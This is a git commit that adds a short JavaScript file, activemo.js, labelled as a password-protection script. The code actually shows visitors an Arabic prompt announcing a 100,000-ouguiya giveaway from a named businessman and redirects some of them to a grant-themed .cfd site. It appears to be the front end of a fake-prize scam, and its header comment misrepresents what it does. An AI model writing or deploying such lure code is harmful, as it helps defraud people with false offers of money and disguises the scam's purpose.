8b0a8a91055e5aaaee6a2eff0145e580e1a2e2c9
The-ongoing <preciousadaowo4@gmail.com>
2026-08-23 21:59:54 +0100

    Create activemo.js

---
+++ activemo.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'سحب الأموال'
+password = prompt(
+  'تهانينا! أنت مؤهل للحصول على 100,000 أوقية من محمد ولد بوعماتو. يُرجى الضغط على «موافق» لاستلامها فورًا.',
+  'سحب الأموال'
+);
+if (password != 'سحب الأموال') {
+  location.href = 'https://ongoing-grant.cfd/Um100000-Boua-Matou.html';
+  }
